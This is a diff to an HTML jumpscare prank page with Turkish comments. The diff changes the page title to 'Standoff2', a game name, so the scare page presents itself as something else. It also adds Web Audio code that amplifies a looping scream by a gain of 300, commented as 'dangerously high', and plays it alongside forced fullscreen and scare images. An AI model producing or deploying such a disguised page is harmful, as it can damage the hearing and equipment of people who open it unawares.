@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Korku Şakası</title>
+  <title>Standoff2</title>
   <style>
     html, body {
       margin: 0;
@@ -84,7 +84,7 @@
     <img id="img1" src="korku1.jpg" />
     <img id="img2" src="korku2.jpg" style="display:none;" />
     <img id="img3" src="korku3.jpg" style="display:none;" />
-    <audio id="scream" src="Scary%20Scream%20Sound%20Effect.mp3" loop></audio>
+    <audio id="scream" src="Scary Scream Sound Effect.mp3" loop></audio>
   </div>
 
   <script>
@@ -100,6 +100,7 @@
     ];
 
     let glitchInterval;
+    let audioCtx, source, gainNode;
 
     startBtn.addEventListener('click', () => {
       startBtn.style.display = 'none';
@@ -115,7 +116,16 @@
       if (document.documentElement.requestFullscreen) {
         document.documentElement.requestFullscreen();
       }
+
       scareBox.style.display = 'block';
+
+      // Web Audio API ile sesi 300 katına çıkar
+      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      source = audioCtx.createMediaElementSource(scream);
+      gainNode = audioCtx.createGain();
+      gainNode.gain.value = 300; // Tehlikeli derecede yüksek!
+
+      source.connect(gainNode).connect(audioCtx.destination);
       scream.play();
 
       let i = 0;
